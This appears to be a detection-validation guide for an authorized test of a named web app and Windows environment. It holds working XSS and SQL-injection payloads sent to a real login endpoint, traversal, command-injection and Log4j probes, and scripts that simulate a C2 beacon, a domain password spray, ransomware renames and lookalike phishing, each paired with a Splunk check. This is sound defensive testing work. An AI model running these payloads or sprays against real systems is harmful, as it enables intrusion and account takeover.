# TDA Testing Guide — Web App + All Use Cases

Authorized detection-validation. **Web target:** `https://hcms.aaagroup.com`
(login posts to `/M/Home/Authenticate`, username field `name="userName"`).
Windows box, admin, **no downloads** (Halcyon) → built-in tools + browser only.

> A Halcyon/WAF **block = detection = PASS** (screenshot it). A gap = it runs and
> nothing logs/alerts. Note UTC time + source IP per test. Authorized scope only.

PowerShell setup (run once per session):
```powershell
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
Get-Date -Format "yyyy-MM-dd HH:mm:ss" ; hostname ; ipconfig | findstr IPv4
```

---

# PART 1 — WEB APP TESTING (hcms.aaagroup.com)

## A. UC0229 — Cross-Site Scripting (XSS)

**Why:** the username you type is reflected back into the page's HTML. If the app
doesn't escape it, your input becomes live HTML/JS = reflected XSS. The field
reflects into an input's `value="..."` and has `maxlength="25"` (client-side only).

### Best payloads (manual — type in the Username box, then Log in)
| Payload | Why / when | Chars |
|---|---|---|
| `"><svg onload=alert(1)>` | **Best first try** — breaks out of double-quoted `value`, svg onload fires reliably | 23 ✅ |
| `'><svg onload=alert(1)>` | if the value uses **single** quotes | 23 ✅ |
| `" autofocus onfocus=alert(1) ` | stays **inside** the attribute (no `>` needed), fires on focus | 29 (remove maxlength) |
| `"><img src=x onerror=alert(1)>` | fallback if svg filtered | 29 (remove maxlength) |
| `<svg onload=alert(1)>` | if it reflects as **plain text** (not in an attribute) | 21 ✅ |
| `"><script>alert(1)</script>` | classic (often blocked / won't run) | 27 (remove maxlength) |

> maxlength is client-side. To use longer payloads: DevTools → click the
> `txtUsername` input → delete `maxlength="25"` → paste.

### Send via PowerShell (bypasses maxlength; good for WAF detection)
```powershell
$u="https://hcms.aaagroup.com/M/Home/Authenticate"
@('"><svg onload=alert(1)>','"><img src=x onerror=alert(1)>','"><script>alert(1)</script>') | ForEach-Object {
  try { Invoke-WebRequest $u -Method POST -Body @{ userName=$_; password="x" } -UseBasicParsing -TimeoutSec 8 | Out-Null } catch {}
}
```

### Confirm it's a REAL vuln (reflected unescaped)
```powershell
$r = Invoke-WebRequest $u -Method POST -Body @{ userName='"><svg onload=alert(1)>'; password='x' } -UseBasicParsing
$r.Content | Select-String 'svg onload=alert'
```
- Shows your payload **unescaped** (`<svg ...>`) → vulnerable 🚩
- Shows it as `&lt;svg...` → escaped → safe

### How to know the right payload (context test)
Submit a marker first and see how it comes back:
```powershell
$r = Invoke-WebRequest $u -Method POST -Body @{userName='xsstest123';password='x'} -UseBasicParsing
$r.Content | Select-String 'xsstest123'
```
- `value="xsstest123"` → use `">...`   · `value='xsstest123'` → use `'>...`   · plain text → use `<svg onload=alert(1)>`

---

## B. UC0228 — SQL Injection

**Why:** login forms build a DB query from your input. If unsanitized, SQL meta-
characters (`'`, `OR`, `--`) change the query — bypassing auth or causing errors.
Even just sending the patterns should trip the WAF/SIEM.

### Login-bypass payloads (Username field)
| Payload | Why |
|---|---|
| `admin' OR '1'='1` | makes the WHERE always true |
| `admin'--` | comments out the password check |
| `' OR 1=1--` | always-true + comment |
| `') OR ('1'='1` | breaks out of a parenthesised query |
| `admin'/*` | comment-based |

### Send via PowerShell
```powershell
$u="https://hcms.aaagroup.com/M/Home/Authenticate"
@("admin' OR '1'='1","admin'--","' OR 1=1--","') OR ('1'='1") | ForEach-Object {
  try { Invoke-WebRequest $u -Method POST -Body @{ userName=$_; password="x" } -UseBasicParsing -TimeoutSec 8 | Out-Null } catch {}
}
```

### Error-based check (does it leak a SQL error?)
```powershell
$r = Invoke-WebRequest $u -Method POST -Body @{ userName="admin'"; password="x" } -UseBasicParsing
$r.Content | Select-String -Pattern "SQL|syntax|ODBC|OLE DB|unclosed"
```
A SQL error in the response = likely injectable (real finding).

---

## C. UC0229 — Other Web Exploits
**Why:** each is a different OWASP attack class the WAF/IPS should flag. Sending the
patterns validates detection (and may reveal real bugs).

```powershell
$base="https://hcms.aaagroup.com"
@(
 "/?q=<script>alert(1)</script>",          # XSS (GET)
 "/?file=../../../../windows/win.ini",     # path traversal (Windows)
 "/?file=../../../../etc/passwd",          # path traversal (Linux)
 "/?cmd=;whoami",                          # command injection
 "/?id=1 AND 1=1",                         # SQLi (GET)
 '/?x=${jndi:ldap://127.0.0.1/a}',         # Log4j probe
 "/?tpl={{7*7}}",                          # SSTI (template injection)
 "/?next=//evil.example.com"               # open redirect
) | ForEach-Object { try { Invoke-WebRequest "$base$_" -UseBasicParsing -TimeoutSec 8 | Out-Null } catch {} }
```

### Validate all web tests (WAF / web logs in Splunk)
```spl
index=* dest="hcms.aaagroup.com" src="<YOUR_IP>" earliest=-20m
| search (uri_query="*<script>*" OR uri_query="*OR*1*1*" OR uri_query="*etc/passwd*" OR uri_query="*jndi*" OR uri_query="*whoami*" OR form_data="*svg*" OR form_data="*OR*1*1*")
| table _time src uri_path uri_query status
```
Also check the **WAF console** for SQLi/XSS/traversal signature hits from your IP.

---

# PART 2 — OTHER USE CASES (step by step + why)

Run in **Admin PowerShell**. Files go to `$env:TEMP`. Each: **why → commands → validate**.

## UC0036 — APT Group Process Creation (Masquerading)
**Why:** attackers rename a malicious binary to a trusted name (`lsass.exe`) and run
it from the wrong folder to blend in. Detection watches for a system-process name
running from a non-system path.
```powershell
Copy-Item C:\Windows\System32\cmd.exe C:\Windows\Temp\lsass.exe
Start-Process C:\Windows\Temp\lsass.exe
Get-Process lsass | Select Id,Path,StartTime
```
Cleanup: `Stop-Process -Name lsass -Force -EA SilentlyContinue; Remove-Item C:\Windows\Temp\lsass.exe -Force`
Splunk: `EventCode=4688 New_Process_Name="*lsass.exe"` → path shows `C:\Windows\Temp`.

## UC0043 — Threat Activity Detected (recon burst)
**Why:** after landing, attackers run many discovery commands fast. A burst of these
from one host is the signal.
```powershell
whoami /all; net user; net group "domain admins" /domain; systeminfo; tasklist; nltest /domain_trusts
```
Splunk: multiple discovery processes (4688) from one host in a short window.

## UC0141 — C2 / Command-and-Control Traffic
**Why:** malware "beacons" to its server at regular intervals. The periodic, repeated
outbound pattern is what C2 detection flags. Use a **lab-controlled** host only.
```powershell
$c2="http://<LAB_C2_HOST>/beacon"
1..30 | ForEach-Object { try { Invoke-WebRequest $c2 -UseBasicParsing -TimeoutSec 5 -Headers @{ "User-Agent"="beacon" } | Out-Null } catch {}; Start-Sleep -Seconds 10 }
```
Splunk/proxy: same src→dest, fixed interval, many small requests.

## UC0046 — Password Spray Detected
**Why:** one password tried across many accounts (low-and-slow to avoid lockout) =
spray. Many failed logons across distinct users from one source is the signal.
```powershell
(net user /domain) | Out-File "$env:TEMP\users.txt"
$users = Get-Content "$env:TEMP\users.txt" | Where-Object { $_ -match '^\S' }
$pw = "Winter2026!"
foreach ($u in $users) { cmd /c "net use \\<DC>\IPC$ /user:$u $pw" 2>$null; Start-Sleep -Milliseconds 300 }
```
Splunk: `EventCode=4625 | stats dc(user) as accounts by src | where accounts>=10`
> Agree the account list + password with the client to avoid lockouts.

## UC0125 — Common Ransomware Extensions Detected
**Why:** ransomware renames files to its own extension and drops a ransom note. Mass
renames to known extensions + a note file is the detection.
```powershell
$dir="$env:TEMP\ransom"; New-Item -ItemType Directory -Force $dir | Out-Null
$ext=".locky",".crypt",".encrypted",".wncry",".cerber",".zepto"
1..20 | ForEach-Object { $f="$dir\doc$_.txt"; "data" | Set-Content $f; Rename-Item $f "$dir\doc$_$($ext[$_ % $ext.Count])" }
"Your files are encrypted. Pay to recover." | Set-Content "$dir\READ_ME_DECRYPT.txt"
```
Cleanup: `Remove-Item "$env:TEMP\ransom" -Recurse -Force`

## UC0032 — Critical Malware Detected on EDR
**Why:** EICAR is the harmless, industry-standard test "malware" every AV/EDR must
flag. Writing + reading it triggers the engine.
```powershell
$e='X5O!P%@AP[4'+'\PZX54(P^)7CC)7}'+'$EICAR-STANDARD-'+'ANTIVIRUS-TEST-FILE!$H+H*'
Set-Content "$env:TEMP\eicar.com" -Value $e -Encoding Ascii
Get-Content "$env:TEMP\eicar.com"
```
Cleanup: `Remove-Item "$env:TEMP\eicar.com" -Force`

## UC0149 — Multiple AV Infections on Same Host
**Why:** several malware detections on one host in a short span = the correlation. Drop
multiple EICAR files.
```powershell
$e='X5O!P%@AP[4'+'\PZX54(P^)7CC)7}'+'$EICAR-STANDARD-'+'ANTIVIRUS-TEST-FILE!$H+H*'
1..5 | ForEach-Object { Set-Content "$env:TEMP\eicar_$_.com" -Value $e -Encoding Ascii }
Get-ChildItem "$env:TEMP\eicar_*.com" | ForEach-Object { Get-Content $_.FullName | Out-Null }
```

## UC0110 — Privilege Change on Firewall
**Why:** creating/elevating a firewall admin is a high-value change attackers make.
**Done on the firewall itself** (not this PC) — needs firewall admin.
- Palo Alto: `set mgt-config users tdatest permissions role-based superuser yes` → `commit`
- Fortinet: `config system admin` → `edit tdatest` → `set accprofile super_admin` → `end`
Validate: firewall admin/audit logs (to SIEM) show the privilege change.

---

## MAIL — need an SMTP relay + a target mailbox

### UC0222 — Suspicious Email Attachment / Malware by Mail
**Why:** tests whether the mail system blocks malware (EICAR) and risky extensions.
```powershell
Copy-Item C:\Windows\System32\calc.exe "$env:TEMP\invoice.exe"
Send-MailMessage -From "tester@yourlab.local" -To "<victim@customer.com>" -Subject "Invoice" -Body "See attached" -Attachments "$env:TEMP\eicar.com","$env:TEMP\invoice.exe" -SmtpServer "<SMTP_SERVER>"
```

### SPLUC0107 — Suspected Phishing Email
**Why:** tests phishing detection — lookalike sender, urgency, suspicious link.
```powershell
Send-MailMessage -From "security-alert@micros0ft-support.com" -To "<victim@customer.com>" -Subject "URGENT: account suspended" -Body "Verify: http://<LAB_PHISH_HOST>/login" -SmtpServer "<SMTP_SERVER>"
```

### UC0575 — Multiple DLP Violations for a User
**Why:** one user sending sensitive data repeatedly = DLP correlation. Needs a DLP-
monitored channel.
```powershell
$dir="$env:TEMP\dlp"; New-Item -ItemType Directory -Force $dir | Out-Null
1..5 | ForEach-Object { "Credit Card: 4111 1111 1111 1111`nSSN: 123-45-6789" | Set-Content "$dir\sensitive_$_.txt" }
Get-ChildItem $dir | ForEach-Object { Send-MailMessage -From "<you>" -To "<external@test.com>" -Subject "data" -Attachments $_.FullName -SmtpServer "<SMTP_SERVER>" }
```

---

## CLOUD — Azure / M365 (do in the BROWSER, no download)
**Why:** these are identity/cloud-plane attacks; they can't come from the endpoint —
use the portal with a test account.

### UC0458 — Azure Activity CRUD
Portal → Resource groups → **Create** `tda-test-rg` → add a **tag** → **Delete** it.
Validate: Azure Activity Log / Sentinel shows create/update/delete.

### UC0215 — Explicit MFA Deny
Sign in to `portal.office.com` as a test user → at the MFA push tap **Deny**.
Validate: Entra sign-in logs show MFA denied.

### UC0327 — Privileged Access Outside PIM
Entra → Roles → assign a privileged role (e.g. User Access Administrator) to the test
user **permanently** (not via PIM) → do an admin action.
Validate: Entra audit log shows privileged action with no PIM activation.

### Password Spraying M365
`login.microsoftonline.com` → try one password across a few agreed test accounts.
Validate: Entra sign-in logs — many failed logons across accounts, one source.

### Malicious MFA Takeover
Spam sign-in push prompts (MFA fatigue), or `aka.ms/mfasetup` → register a new MFA
method on the test account.
Validate: Entra logs — repeated MFA requests or new security-info registration.

---

## Per-test checklist
1. Note UTC time + source.  2. Announce to SOC.  3. Run.
4. Halcyon/WAF block → screenshot = PASS.  5. Pull events (adjust index/fields).
6. Record pass/gap.  7. Clean up.

*Use only fake test data and lab-controlled hosts. Field names vary by data source.*
